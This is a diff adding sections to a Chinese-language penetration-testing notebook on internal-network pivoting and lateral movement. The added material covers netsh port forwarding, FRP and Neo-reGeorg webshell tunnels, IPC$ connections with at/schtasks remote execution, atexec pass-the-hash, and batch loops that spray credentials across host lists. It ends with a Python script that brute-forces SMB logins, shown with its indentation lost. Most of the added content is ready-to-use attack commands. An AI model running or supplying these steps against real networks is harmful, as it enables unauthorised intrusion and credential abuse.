@@ -1,5 +1,9 @@
-# 简介
+# 内网知识 - 三层代理
 
+> 本文作者：[XiDanEr](https://github.com/xidaner)
+> 更新日期 2021年7月21日
+
+---
 在实战渗透中,我们经常遇到打下目标网站,然后需要进一步横向渗透的情况;本文旨在教大家如何在拿下目标一台机器之后,进行内网横穿以及端口转发
 
 
@@ -544,4 +548,299 @@ nano /etc/rinetd.conf(添加一行)
     ```cmd
     REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f
     ```
+
+
+---
+
+# windows netsh设置代理服务器/端口转发
+
+可以查看存在的转发
+netsh interface portproxy show all
+
+添加一个IPV4到IPV4的端口映射
+```
+netsh interface portproxy add v4tov4 listenport=22 listenaddress=192.168.91.133 connectaddress=ip connectport=port
+
+netsh interface portproxy add v4tov4 listenport=56789 connectaddress=127.0.0.1 connectport=3389
+
+netsh interface portproxy add v4tov4 listenport=8081 connectaddress=192.168.91.139 connectport=8080
+
+
+
+```
+
+删除指定转发端口
+```
+netsh interface portproxy delete v4tov4 listenport=port
+```
+
+例如，将连接从本地端口5555转发至远程地址157.166.226.25（CNN网站）：
+```
+netsh interface portproxy add v4tov4 listenport=3389 connectaddress=192.168.91.133 connectport=3389
+
+netsh interface portproxy add v4tov4 listenport=8848 connectaddress=192.168.91.129 connectport=8848
+
+```
+
+清除所有当前的端口转发规则：
+```
+netsh interface portproxy reset
+```
+
+现在，如果你在浏览器中访问http://localhost:5555/，则将打开CNN网站的主页。因此，尽管浏览器对本地计算机进行了寻址，但它仍会打开一个远程页面。
+```
+netsh interface portproxy add v4tov4 listenport=5555 connectport=80 connectaddress= 157.166.226.25 protocol=tcp
+```
+
+# FRP
+
+配置 FRP 代理链，上传 FRP 文件夹，这里需要注意的是4个文件，分别是frpc、frpc.ini和frps、frps.ini，前者两个文件是客户端所关注文件，后者两个文件是服务端所关注两个文件。
+
+但在启动前，我们需要先修改配置文件，我们以配置“Windows 远程桌面控制”以及“群晖 NAS 管理界面”为例。假设你的 FRP 服务端所在的 VPS 公网 IP 为 1.2.3.4， 而客户端是 Win 电脑，我们来修改 frpc.ini 配置文件：
+```
+[common]
+# server_addr 为 FRP 服务端 (VPS 服务器) 的公网 IP
+server_addr = 1.2.3.4
+server_port = 7000
+
+[DSM]
+type = tcp
+local_ip = 192.168.1.40 #群晖 NAS 在局域网中的内网 IP
+local_port = 5000
+remote_port = 7001
+
+[RDP]
+type = tcp
+local_ip = 192.168.1.30 #电脑在局域网中的内网 IP (如是本机，也可使用 127.0.0.1)
+local_port = 3389
+remote_port = 7002
+```
+
+---
+**启动 FRP 服务端**
+
+```
+./frps -c ./frps.ini
+```
+如服务器使用 Win 系统，假设解压到 c:\frp 文件夹，那么只需这样启动：
+
+```
+c:\frp\frps.exe -c c:\frp\frps.ini
+```
+
+
+
+---
+
+**启动 FRP 客户端**
+假设你已将 Frp 的客户端解压缩到 c:\frp 目录中，那么启动 Frp 客户端的命令就是：
+```
+c:\frp\frpc.exe -c c:\frp\frpc.ini
+```
+
+**Linux 启动 Frp 客户端命令**
+
+```
+./frpc -c ./frpc.ini
+```
+
+启动之后看到 “`start proxy success`”字样就表示启动成功了。
+
+
+
+### Neo-reGeorg
+
+项目地址:   https://github.com/L-codes/Neo-reGeorg
+
+- 示例
+
+    - 生成tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器
+
+        python3 neoreg.py generate -k password
+
+    -  使用 neoreg.py 连接 WEB 服务器,在本地建立 socks5 代理
+
+        python3 neoreg.py -k password -u http://xx/tunnel.php
+
+    - 高阶用法
+
+        - 支持生成的服务端,默认直接请求响应指定的页面内容(如伪装的404页面)
+
+            python neoreg.py generate -k <you_password> --file 404.html --httpcode 404
+            python neoreg.py -k <you_password> -u <server_url> --skip
+
+        - 如服务端 WEB,需要设置代理才能访问
+
+            python neoreg.py -k <you_password> -u <server_url> --proxy socks5://10.1.1.1:8080
+
+        - 如需 Authorization 认证和定制的 Header 或 Cookie
+
+            python neoreg.py -k <you_password> -u <server_url> -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie "key=value;key2=value2"
+
+        - 需要分散请求,可上传到多个路径上,如内存马
+
+            python neoreg.py -k <you_password> -u <url_1> -u <url_2> -u <url_3> ...
+
+        - 开启内网转发,应对负载均衡
+
+            python neoreg.py -k <you_password> -u <url> -r <redirect_url>
+
+        - 更多关于性能和稳定性的参数设置参考 -h 帮助信息
+
+            - 生成服务端脚本
+
+                python neoreg.py generate -h
+
+            - 连接服务端
+
+                python neoreg.py -h
+
+
+---
+
+**案例1-横向渗透明文传递at&schtasks**
+
+在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？这里仅介绍at&schtasks命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。
+获取到某域主机权限->minikatz得到密码（明文，hash）->用到信息收集里面域用户的列表当做用户名字典->用到密码明文当做密码字典-》尝试连接->创建计划任务(at|schtasks)->执行文件可为后门或者相关命令
+利用流程
+1. 建立IPC链接到目标主机
+2. 拷贝要执行的命令脚本到目标主机
+3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本
+4. 删除IPC链接
+
+```BASH
+net use \\server\ipc$"password" /user:username # 工作组
+net use \\server\ipc$"password" /user:domain\username #域内
+dir \\xx.xx.xx.xx\C$\                # 查看文件列表
+copy \\xx.xx.xx.xx\C$\1.bat 1.bat  # 下载文件
+copy 1.bat \\xx.xx.xx.xx\C$  # 复制文件
+net use \\xx.xx.xx.xx\C$\1.bat /del  # 删除IPC
+net view xx.xx.xx.xx                # 查看对方共享
+```
+### 建立IPC常见的错误代码
+
+
+
+
+```
+（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限
+（2）51：网络问题，Windows 无法找到网络路径
+（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题
+（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$
+（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除
+（6）1326：账号密码错误
+（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况
+（8）2242：用户密码过期，目标有账号策略，强制定期更改密码
+```
+**建立IPC失败的原因**
+```
+（1）目标系统不是NT或以上的操作系统
+（2）对方没有打开IPC$共享
+（3）对方未开启139、445端口，或者被防火墙屏蔽
+（4）输出命令、账号密码有错误
+```
+
+
+**[at] & [schtasks]**
+```bash
+#at < Windows2012
+net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\ad
+ministrator # 建立ipc连接：
+copy add.bat \\192.168.3.21\c$  #拷贝执行文件到目标机器
+at \\192.168.3.21 15:47 c:\add.bat    #添加计划任务
+
+#schtasks >=Windows2012
+net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
+ministrator # 建立ipc连接：
+copy add.bat \\192.168.3.32\c$ #复制文件到其C盘
+schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
+schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
+schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
+
+#案例2-横向渗透明文HASH传递atexec-impacket
+atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"
+atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"
+atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
+```
+
+**案例3-横向渗透明文HASH传递批量利用-综合**
+
+```bash
+FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ "admin!@#45" /user:administrator #批量检测IP对应明文连接
+FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测IP对应明文回显版
+FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应IP回显版
+FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测HASH对应IP回显版
+```
+
+**案例4-横向渗透明文HASH传递批量利用-升级版**
+
+前期除了收集明文密码HASH等，还收集了用户名，用户名配合密码字典能吃西瓜？
+```
+net use \\192.168.3.32\ipc$ admin!@#45 /user:god\dbadmin
+
+#pip install pyinstaller
+#pyinstaller -Ffuck_neiwang_001.py生成可执行EXE
+```
+使用该脚本去爆破用户密码
+```PY
+import os,time
+ips={
+'192.168.3.21',
+'192.168.3.25',
+'192.168.3.29',
+'192.168.3.30',
+'192.168.3.31',
+'192.168.3.33'
+}
+
+users={
+'Administrator',
+'boss',
+'dbadmin',
+'fileadmin',
+'mack',
+'mary',
+'vpnadm',
+'webadmin'
+}
+passs={
+    # 输入抓取的密码hash
+'admin',
+'admin!@#45',
+'Admin12345'
+}
+
+for ip in ips:
+for user in users:
+for mima in passs:
+exec="net use \\"+ "\\"+ip+'\ipc$ '+mima+' /user:god\\'+user
+print('--->'+exec+'<---')
+os.system(exec)
+time.sleep(1)
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
